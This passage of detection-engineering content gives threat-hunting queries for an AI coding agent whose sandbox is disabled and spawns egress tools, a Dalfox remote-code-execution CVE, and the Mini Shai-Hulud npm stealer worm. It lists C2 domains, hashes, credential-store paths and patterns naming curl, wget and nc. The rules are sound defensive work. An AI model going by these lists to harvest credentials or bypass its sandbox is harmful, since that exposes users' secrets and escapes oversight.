   or (TargetProcessCommandLine has "base64" and TargetProcessCommandLine has_any ("curl ","wget "," nc ","|nc "))

| project TimeGenerated, DvcHostname, ActorUsername,

[LLM] OpenClaude Node CLI Spawning Egress LOLBin — Sandbox-Bypassed Bash Tool Use Command & Control Medium
Broader hunt around the same root cause: the OpenClaude Node agent (`node ... cli.mjs`) spawning any direct network-egress utility (curl, wget, nc, scp, ssh, ftp, certutil) once `dangerouslyDisableSandbox` removes the confinement. When sandboxed, BashTool commands run inside the sandbox and don't show this parent-to-egress relationship — when bypassed, they do. Pair with first-time-seen baseline to suppress legitimate developer-initiated agent runs. Rationale: Roots in the article's own architecture: when shouldUseSandbox() returns false (the vulnerable branch at shouldUseSandbox.ts:130-141 with default allowUnsandboxedCommands=true), BashTool commands escape confinement and the child process is the agent's Node parent → shell → egress utility. Sandboxed runs of OpenClaude don't show this parent-to-LOLBin process tree because the sandbox isolates the namespace. Sigma left empty because this UC uses a 30-day leftanti baseline and a time-window join to DeviceNetworkEvents — multi-event correlation that Sigma's single-event-shape schema cannot express cleanly.
ATT&CKT1105 T1071.001 T1480 T1059.004

[LLM] Dalfox process spawns shell with -c (CVE-2026-45087 found-action RCE) Exploitation High
Hunts the post-exploitation footprint of CVE-2026-45087: the dalfox binary itself invoking `exec.Command(FoundActionShell, "-c", afterCmd)` after an attacker-controlled JSON scan is POSTed to /scan. A `dalfox` → `bash|sh|zsh|cmd.exe|powershell.exe` parent/child with `-c` in the command line is highly anomalous because dalfox normally never spawns sub-shells unless an operator explicitly configured found-action. Rationale: Anchored on the article's exact code path `exec.Command(options.FoundActionShell, "-c", afterCmd)` in pkg/scanning/foundaction.go and the PoC's `"found-action-shell": "bash"`. The parent binary `dalfox` is unique and not used by anything else in normal SOC telemetry; pairing parent=dalfox with any child shell + `-c` is the same parent/child pattern produced ONLY by an attacker-controlled found-action payload firing on a scan finding. Image filename matching is broad (Linux + Windows shells) because FoundActionShell is attacker-supplied. Cross-checked against: • https://github.com/advisories/GHSA-v25v-m36w-jp4h • https://github.com/hahwul/dalfox/blob/main/pkg/scanning/foundaction.go
ATT&CKT1190 T1059.004 T1059.003

| where Timestamp > ago(7d)

[LLM] Dalfox REST server started without --api-key (CVE-2026-45087 exposure) Reconnaissance Medium
Catches the vulnerable misconfiguration at the source: a process invocation of `dalfox server ... --type rest` without `--api-key` and without a localhost bind. This is the precondition for unauthenticated CVE-2026-45087 exploitation and lets a SOC remediate before any /scan POST arrives. Rationale: Built from the article's exact configuration facts: `cmd/server.go:51` empty default for `--api-key`, `setupEchoServer` at `pkg/server/server.go:68` only installs auth middleware when APIKey != "", default bind `0.0.0.0:6664`. Matching `dalfox server` without `--api-key` and without a loopback `--host` flag captures the precise vulnerable invocation; filtering loopback binds removes legitimate localhost-only test runs. Cross-checked against: • https://github.com/advisories/GHSA-v25v-m36w-jp4h • https://github.com/hahwul/dalfox/blob/main/cmd/server.go • https://github.com/hahwul/dalfox/blob/main/pkg/server/server.go
ATT&CKT1190 T1133
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "dalfox" or FileName =~ "dalfox.exe"
| where ProcessCommandLine has "server"
| where ProcessCommandLine !has "--api-key"
| where not(ProcessCommandLine has "--host 127.0.0.1" or ProcessCommandLine has "--host localhost")
| extend HasRest = iif(ProcessCommandLine has "--type rest" or not(ProcessCommandLine has "--type"), true, false)
| where HasRest == true
| project Timestamp, DeviceName, AccountName, FolderPath, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where TargetProcessName endswith "/dalfox" or TargetProcessName endswith @"\dalfox" or TargetProcessName endswith @"\dalfox.exe" or TargetProcessName =~ "dalfox"
| where TargetProcessCommandLine has "server"
| where TargetProcessCommandLine !has "--api-key"
| where not(TargetProcessCommandLine has "--host 127.0.0.1" or TargetProcessCommandLine has "--host localhost")
| extend HasRest = iif(TargetProcessCommandLine has "--type rest" or not(TargetProcessCommandLine has "--type"), true, false)
| where HasRest == true
| project TimeGenerated, DvcHostname, ActorUsername, TargetProcessCommandLine, ParentProcessName
| order by TimeGenerated desc

[LLM] Mini Shai-Hulud npm Worm C2 callback to Session Protocol CDN and masscan.cloud Command & Control High
Detects DNS resolution or outbound TCP/UDP to the Session Protocol seed nodes (seed1.getsession.org, filev2.getsession.org) and api.masscan.cloud used by TeamPCP's Mini Shai-Hulud worm to exfiltrate harvested CI/CD secrets and developer credentials. These hostnames are not part of any legitimate enterprise software supply chain and any contact is high-fidelity. Rationale: Domains seed1.getsession.org, filev2.getsession.org, and api.masscan.cloud are named explicitly as the worm's exfiltration channel in the StepSecurity write-up. Session Protocol nodes have zero legitimate enterprise use and api.masscan.cloud is the same C2 infrastructure observed across the @antv variant (memory observation 1252) — high-fidelity primary IOCs across multiple StepSecurity / Socket.dev / JFrog reports on the campaign. Cross-checked against: • https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem • https://attack.mitre.org/techniques/T1567/ • https://attack.mitre.org/techniques/T1071/001/
ATT&CKT1071.001 T1567 T1568
Data sourcesNetwork_Traffic.All_Traffic Network_Resolution.DNS
let CampaignHosts = dynamic(["seed1.getsession.org","filev2.getsession.org","api.masscan.cloud"]);
let NetHits = DeviceNetworkEvents
  | where Timestamp > ago(30d)
  | where RemoteUrl has_any (CampaignHosts) or tostring(parse_url(RemoteUrl).Host) in~ (CampaignHosts)
  | project Timestamp, DeviceName, AccountUpn=InitiatingProcessAccountUpn, Indicator=coalesce(RemoteUrl, RemoteIP), Source="network", InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName;
let EvHits = DeviceEvents
  | where Timestamp > ago(30d)
  | where ActionType in ("DnsQueryResponse","ConnectionSuccess","ConnectionFailed","NetworkConnectionEvents")
  | where RemoteUrl has_any (CampaignHosts) or AdditionalFields has_any (CampaignHosts)
  | project Timestamp, DeviceName, AccountUpn=InitiatingProcessAccountUpn, Indicator=coalesce(RemoteUrl, tostring(AdditionalFields)), Source="device-event", InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName=tostring(parse_json(""));
NetHits
| union EvHits
| order by Timestamp desc
let CampaignHosts = dynamic(["seed1.getsession.org","filev2.getsession.org","api.masscan.cloud"]);
let DnsHits = DnsEvents
  | where TimeGenerated > ago(30d)
  | where Name has_any (CampaignHosts)
  | project TimeGenerated, Computer, ClientIP, Indicator=Name, Source="DnsEvents";
let AsimDns = ImDnsActivity
  | where TimeGenerated > ago(30d)
  | where DnsQuery has_any (CampaignHosts)
  | project TimeGenerated, Computer=DvcHostname, ClientIP=SrcIpAddr, Indicator=DnsQuery, Source="ImDnsActivity";
let ProxyHits = CommonSecurityLog
  | where TimeGenerated > ago(30d)
  | where DestinationHostName has_any (CampaignHosts) or RequestURL has_any (CampaignHosts)
  | project TimeGenerated, Computer=SourceHostName, ClientIP=SourceIP, Indicator=coalesce(DestinationHostName, RequestURL), Source="Proxy/CEF";
let WebHits = ImWebSession
  | where TimeGenerated > ago(30d)
  | where HttpHostName has_any (CampaignHosts) or Url has_any (CampaignHosts)
  | project TimeGenerated, Computer=DvcHostname, ClientIP=SrcIpAddr, Indicator=coalesce(HttpHostName, Url), Source="ImWebSession";
DnsHits | union AsimDns, ProxyHits, WebHits
| summarize FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated), Hits=count() by Computer, ClientIP, Indicator, Source
| order by LastSeen desc

[LLM] TeamPCP Mini Shai-Hulud stealer payload hash match (SHA256/SHA1) Installation High
Alerts on disk-write or in-memory execution of a binary whose SHA256 or SHA1 matches the obfuscated 2.3 MB credential-stealer payload published by TeamPCP across @tanstack, @uipath, @draftlab and other compromised npm packages. The hashes are the cleanest single-source-of-truth IOCs in this campaign and are reused unchanged across all 50+ compromised package versions. Rationale: Four SHA256 and three SHA1 hashes were published in the StepSecurity article as the canonical fingerprint of the 2.3 MB obfuscated stealer payload. These hashes were observed unchanged across all listed @tanstack/@uipath/@draftlab versions and were corroborated in earlier @antv variant reporting (Socket.dev, JFrog, StepSecurity — memory observations 1249, 1250, 1252). Hash-based hunting carries zero ambiguity and zero FP risk against benign software. Cross-checked against: • https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem • https://attack.mitre.org/techniques/T1195/002/
ATT&CKT1195.002 T1059.007 T1027
Data sourcesEndpoint.Processes Endpoint.Filesystem

let StealerSha1 = dynamic(["79ac49eedf774dd4b0cfa308722bc463cfe5885c","de0fac2e4500dabe0009e67214ff5f5447ce83dd","bbbca2ddaa5d8feaa63e36b76fdaad77386f024f"]);
let ProcHits = DeviceProcessEvents
  | where Timestamp > ago(30d)
  | where SHA256 in~ (StealerSha256) or SHA1 in~ (StealerSha1) or InitiatingProcessSHA256 in~ (StealerSha256) or InitiatingProcessSHA1 in~ (StealerSha1)
  | project Timestamp, DeviceName, AccountName, FileName, FolderPath, SHA256, ProcessCommandLine, InitiatingProcessFileName, Source="DeviceProcessEvents";
let FileHits = DeviceFileEvents
  | where Timestamp > ago(30d)
  | where SHA256 in~ (StealerSha256) or SHA1 in~ (StealerSha1)
  | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, FileName, FolderPath, SHA256, ProcessCommandLine=InitiatingProcessCommandLine, InitiatingProcessFileName, Source="DeviceFileEvents";
let ImgHits = DeviceImageLoadEvents
  | where Timestamp > ago(30d)
  | where SHA256 in~ (StealerSha256) or SHA1 in~ (StealerSha1)
  | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, FileName, FolderPath, SHA256, ProcessCommandLine=InitiatingProcessCommandLine, InitiatingProcessFileName, Source="DeviceImageLoadEvents";
ProcHits | union FileHits, ImgHits
| order by Timestamp desc

let StealerSha1 = dynamic(["79ac49eedf774dd4b0cfa308722bc463cfe5885c","de0fac2e4500dabe0009e67214ff5f5447ce83dd","bbbca2ddaa5d8feaa63e36b76fdaad77386f024f"]);
let FileHits = ImFileEvent

[LLM] Mini Shai-Hulud router_init.js dropped at npm package root in node_modules Installation High
Detects file writes of a router_init.js file directly at a package root inside node_modules with a size > 1 MB on a single line — the exact filesystem signature documented in the StepSecurity comparison of clean (1.166.42) vs compromised (1.166.48) @tanstack tarballs (2,341,681 bytes, single line). Catches the worm at install time before the preinstall payload executes. Rationale: Table 2 in the article (Clean 1.166.42 vs Compromised 1.166.48) explicitly identifies router_init.js at root, 2,341,681 bytes, single line, as the structural marker of every compromised tarball. The file is absent from clean versions and is the worm's first-stage loader — file create from npm/node into node_modules is the exact moment of compromise. Cross-checked against the @antv variant analysis (memory observation 1247) which also noted the same loader file pattern. Cross-checked against: • https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem • https://attack.mitre.org/techniques/T1195/002/
ATT&CKT1195.002 T1027 T1546
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileRenamed")
| where FileName =~ "router_init.js"
| where FolderPath has "node_modules"
| where FileSize > 1000000  // clean tarball baseline is no router_init.js; compromised version is ~2.3MB single line
| where InitiatingProcessFileName in~ ("node.exe","npm.exe","npm","node","pnpm.exe","yarn.exe","bun.exe","bun","corepack.exe")
   or InitiatingProcessParentFileName in~ ("node.exe","npm.exe","pnpm.exe","yarn.exe","bun.exe","corepack.exe")
| project Timestamp, DeviceName, FolderPath, FileName, FileSize, SHA256,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessParentFileName, InitiatingProcessAccountName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType in ("FileCreated","FileCreate","FileRenamed")
| where TargetFileName =~ "router_init.js"
| where TargetFilePath has "node_modules"
| where TargetFileSize > 1000000
| where ActingProcessName has_any ("node","npm","pnpm","yarn","bun","corepack")
| project TimeGenerated, DvcHostname, ActorUsername, TargetFilePath, TargetFileName, TargetFileSize, TargetFileSHA256, ActingProcessName, ActingProcessCommandLine
| order by TimeGenerated desc

[LLM] Mini Shai-Hulud dead-drop git commit authored as claude@users.noreply.github.com Actions on Objectives High
Detects git commit / push activity where the author email is claude@users.noreply.github.com — TeamPCP's exfiltration signature where stolen secrets are written to attacker-controlled branches via GitHub's GraphQL API, disguised with Dependabot-style branch names drawn from Frank Herbert's Dune universe. Watch for both git.exe invocations and proxied GraphQL commit metadata. Rationale: The article calls out claude@users.noreply.github.com as the verbatim author identity used for every dead-drop commit, paired with Dependabot-style Dune-themed branch names. This email is not a legitimate GitHub-issued no-reply for any real Anthropic/Claude integration and any commit signed with it is attacker activity. The literal string is high-fidelity and zero-collision across enterprise git telemetry. Cross-checked against: • https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem • https://attack.mitre.org/techniques/T1567/002/
ATT&CKT1567.002 T1071.001 T1078.004
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("git.exe","git") or InitiatingProcessFileName in~ ("git.exe","git")
| where ProcessCommandLine has "claude@users.noreply.github.com"
   or InitiatingProcessCommandLine has "claude@users.noreply.github.com"
   or (ProcessCommandLine has "commit" and ProcessCommandLine has_any ("--author","user.email"))
| extend DuneBranchHint = extract(@"(?i)dependabot[-_/]+(arrakis|fremen|paul|atreides|harkonnen|leto|muad'dib|muaddib|shai-hulud|stilgar|gurney|duncan|chani|jessica|spice|melange|sardaukar|bene-gesserit|kwisatz)", 1, ProcessCommandLine)
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessParentFileName, DuneBranchHint
| order by Timestamp desc
let ProcHits = SecurityEvent

  | where NewProcessName endswith "\\git.exe" or NewProcessName endswith "/git"
  | where CommandLine has "claude@users.noreply.github.com"

[LLM] Node/npm/Bun process enumerating cloud, wallet, AI, and messaging credential file paths Actions on Objectives Medium
Hunts for node, npm, pnpm, yarn, or bun processes touching the high-value credential file paths that Mini Shai-Hulud's 2.3 MB stealer iterates over (the article cites 100+ paths spanning cloud providers, crypto wallets, AI tools, and messaging apps). The stealer rapidly opens many of these in a single process lifetime — a single-file hit is weak, the fan-out is the signal. Rationale: The article specifies that the 2.3 MB obfuscated payload harvests credentials from 'over 100 file paths spanning cloud providers, cryptocurrency wallets, AI tools, and messaging apps' — and installs persistence in Claude Code and VS Code. A single file touch by node is noise; a fan-out to 6+ distinct cred paths by one node process in seconds is the worm's signature. Sigma omitted because this detection inherently requires a dcount/threshold aggregation. False-positive scenarios filtered by excluding IDE auto-launches. Cross-checked against: • https://www.stepsecurity.io/blog/mini-shai-hulud-is-back-a-self-spreading-supply-chain-attack-hits-the-npm-ecosystem • https://attack.mitre.org/techniques/T1552/001/ • https://attack.mitre.org/techniques/T1555/
ATT&CKT1552.001 T1555 T1005 T1083
Data sourcesEndpoint.Filesystem
let CredPaths = dynamic([
  @"\.aws\credentials", @"\.aws\config", @".npmrc", @"\.config\gh\hosts.yml",
  @"\.config\gcloud\", @"\.azure\accessTokens.json", @"\.kube\config",
  @"\.docker\config.json", @"\.ssh\id_", @"\AppData\Roaming\Claude",
  @"\AppData\Roaming\Cursor", @"\AppData\Roaming\Code\User\globalStorage",
  "wallet.dat", @"\Local Extension Settings\", @"\Slack\Cookies",
  @"\Discord\Local Storage\leveldb", @"\Telegram Desktop\tdata",
  ".env", @"\Local\Programs\Ollama", @"\.netrc"
]);
DeviceFileEvents
| where Timestamp > ago(7d)
| where ActionType in ("FileAccessed","FileCreated","FileRenamed","FileModified")
| where InitiatingProcessFileName in~ ("node.exe","npm.exe","pnpm.exe","yarn.exe","bun.exe","corepack.exe")
| where FolderPath has_any (CredPaths) or FileName has_any (CredPaths)
| where InitiatingProcessParentFileName !in~ ("code.exe","cursor.exe","claude.exe")  // strip dev IDEs auto-reading own settings
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp), DistinctPaths=dcount(FolderPath), SamplePaths=make_set(strcat(FolderPath,"\\",FileName), 10)
          by DeviceName, InitiatingProcessFileName, InitiatingProcessId, InitiatingProcessCommandLine, InitiatingProcessAccountName
| where DistinctPaths >= 6   // empirical: stealer fan-out >> any single legit operation
| order by LastSeen desc
let CredPathsAny = dynamic([
  "\\.aws\\credentials","\\.aws\\config",".npmrc","\\.config\\gh\\hosts.yml",
  "\\.config\\gcloud\\","\\.azure\\accessTokens.json","\\.kube\\config",
  "\\.docker\\config.json","\\.ssh\\id_","\\AppData\\Roaming\\Claude",
  "\\AppData\\Roaming\\Cursor","\\AppData\\Roaming\\Code\\User\\globalStorage",
  "wallet.dat","\\Local Extension Settings\\","\\Slack\\Cookies",
  "\\Discord\\Local Storage\\leveldb","\\Telegram Desktop\\tdata",".env","\\.netrc"
]);
ImFileEvent
| where TimeGenerated > ago(7d)
| where ActingProcessName has_any ("node","npm","pnpm","yarn","bun","corepack")
| where TargetFilePath has_any (CredPathsAny) or TargetFileName has_any (CredPathsAny)
| summarize FirstSeen=min(TimeGenerated), LastSeen=max(TimeGenerated), DistinctPaths=dcount(TargetFilePath), SamplePaths=make_set(TargetFilePath, 10)
          by DvcHostname, ActingProcessName, ActingProcessId, ActingProcessCommandLine, ActorUsername
| where DistinctPaths >= 6
| order by LastSeen desc
source:(windows.sysmon OR linux.auditd) (@EventID:11 OR @auditd.type:(EXECVE OR PATH OR OPEN)) (@Image:(*\\node.exe OR *\\npm.exe OR *\\pnpm.exe OR *\\yarn.exe OR *\\bun.exe OR *\\corepack.exe) OR @process.executable.path:(*/bin/node OR */bin/npm OR */bin/pnpm OR */bin/yarn OR */bin/bun)) (@TargetFilename:(*\\.aws\\credentials* OR *\\.npmrc* OR *\\.ssh\\id_* OR *\\AppData\\Roaming\\Claude* OR *\\AppData\\Roaming\\Cursor* OR *\\.config\\gh\\hosts.yml* OR *\\.docker\\config.json* OR *\\.kube\\config* OR *wallet.dat* OR *\\Slack\\Cookies* OR *\\Telegram\\ Desktop\\tdata* OR *.env) OR @file.path:(*/.aws/credentials OR */.npmrc OR */.ssh/id_* OR */.config/gh/hosts.yml OR */.config/gcloud/* OR */.docker/config.json OR */.kube/config OR */wallet.dat OR */.env))
(#event_simpleName=FileOpenInfo OR #event_simpleName=FileWritten)
| ContextImageFileName=/(node|npm|pnpm|yarn|bun|corepack)(\.exe)?$/i
| regex("(\\\\\\.aws\\\\credentials|\\\\\\.npmrc|\\\\\\.ssh\\\\id_|\\\\AppData\\\\Roaming\\\\Claude|\\\\AppData\\\\Roaming\\\\Cursor|\\\\AppData\\\\Roaming\\\\Code\\\\User\\\\globalStorage|\\\\\\.config\\\\gh\\\\hosts\\.yml|\\\\\\.docker\\\\config\\.json|\\\\\\.kube\\\\config|wallet\\.dat|\\\\Slack\\\\Cookies|\\\\Telegram Desktop\\\\tdata|\\\\\\.env)", field=TargetFileName, flags="i")
| groupBy([aid, ComputerName, ContextProcessId, ContextImageFileName], function={count(field=TargetFileName, distinct=true, as=DistinctPaths) | min(_time, as=FirstSeen) | max(_time, as=LastSeen)})
| DistinctPaths >= 6
| sort(LastSeen, order=desc)

| tstats summariesonly=false count dc(Filesystem.file_path) as DistinctPaths min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where Filesystem.process_name IN ("node.exe","node","npm.exe","npm","pnpm.exe","yarn.exe","bun.exe","bun") (Filesystem.file_path="*\\.aws\\credentials*" OR Filesystem.file_path="*\\.aws\\config*" OR Filesystem.file_path="*\\.npmrc*" OR Filesystem.file_path="*\\.config\\gh\\hosts.yml*" OR Filesystem.file_path="*\\.config\\gcloud\\*" OR Filesystem.file_path="*\\.azure\\accessTokens.json*" OR Filesystem.file_path="*\\.kube\\config*" OR Filesystem.file_path="*\\.docker\\config.json*" OR Filesystem.file_path="*\\.ssh\\id_*" OR Filesystem.file_path="*\\AppData\\Roaming\\Claude*" OR Filesystem.file_path="*\\AppData\\Roaming\\Cursor*" OR Filesystem.file_path="*\\AppData\\Roaming\\Code\\User\\globalStorage*" OR Filesystem.file_path="*wallet.dat*" OR Filesystem.file_path="*\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\*" OR Filesystem.file_path="*\\.env*" OR Filesystem.file_path="*\\Slack\\Cookies*" OR Filesystem.file_path="*\\Discord\\Local Storage\\leveldb\\*" OR Filesystem.file_path="*\\Telegram Desktop\\tdata\\*") by Filesystem.dest Filesystem.user Filesystem.process_name | `drop_dm_object_name(Filesystem)` | where DistinctPaths >= 6 | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02

    - attack.t1539
    - attack.t1555.003

    category: file_access

    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'

        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'

Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-45321")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-45321")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc
APPLICATION
Toggle if your env has no CIM data-model acceleration.

    from datamodel=Vulnerabilities

    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "2258284d65f63829bd67eaba01ef6f1ada2f593f9bbe41678b2df360bd90d3df", "1e8538c6e0563d50da0f2e097e979ebd5294ce1defe01d0b9fe361ba3bed1898", "e7d582b98ca80690883175470e96f703ef6dc497", "12f35b1081b17d21815b35feb57ab03d02482116", "820fa07a7328b6cf2b417078e103721d4d8f2e79") or SHA1 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "2258284d65f63829bd67eaba01ef6f1ada2f593f9bbe41678b2df360bd90d3df", "1e8538c6e0563d50da0f2e097e979ebd5294ce1defe01d0b9fe361ba3bed1898", "e7d582b98ca80690883175470e96f703ef6dc497", "12f35b1081b17d21815b35feb57ab03d02482116", "820fa07a7328b6cf2b417078e103721d4d8f2e79") or MD5 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "2258284d65f63829bd67eaba01ef6f1ada2f593f9bbe41678b2df360bd90d3df", "1e8538c6e0563d50da0f2e097e979ebd5294ce1defe01d0b9fe361ba3bed1898", "e7d582b98ca80690883175470e96f703ef6dc497", "12f35b1081b17d21815b35feb57ab03d02482116", "820fa07a7328b6cf2b417078e103721d4d8f2e79")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "2258284d65f63829bd67eaba01ef6f1ada2f593f9bbe41678b2df360bd90d3df", "1e8538c6e0563d50da0f2e097e979ebd5294ce1defe01d0b9fe361ba3bed1898", "e7d582b98ca80690883175470e96f703ef6dc497", "12f35b1081b17d21815b35feb57ab03d02482116", "820fa07a7328b6cf2b417078e103721d4d8f2e79") or SHA1 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "2258284d65f63829bd67eaba01ef6f1ada2f593f9bbe41678b2df360bd90d3df", "1e8538c6e0563d50da0f2e097e979ebd5294ce1defe01d0b9fe361ba3bed1898", "e7d582b98ca80690883175470e96f703ef6dc497", "12f35b1081b17d21815b35feb57ab03d02482116", "820fa07a7328b6cf2b417078e103721d4d8f2e79") or MD5 in~ ("ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c", "2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96", "2258284d65f63829bd67eaba01ef6f1ada2f593f9bbe41678b2df360bd90d3df", "1e8538c6e0563d50da0f2e097e979ebd5294ce1defe01d0b9fe361ba3bed1898", "e7d582b98ca80690883175470e96f703ef6dc497", "12f35b1081b17d21815b35feb57ab03d02482116", "820fa07a7328b6cf2b417078e103721d4d8f2e79")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
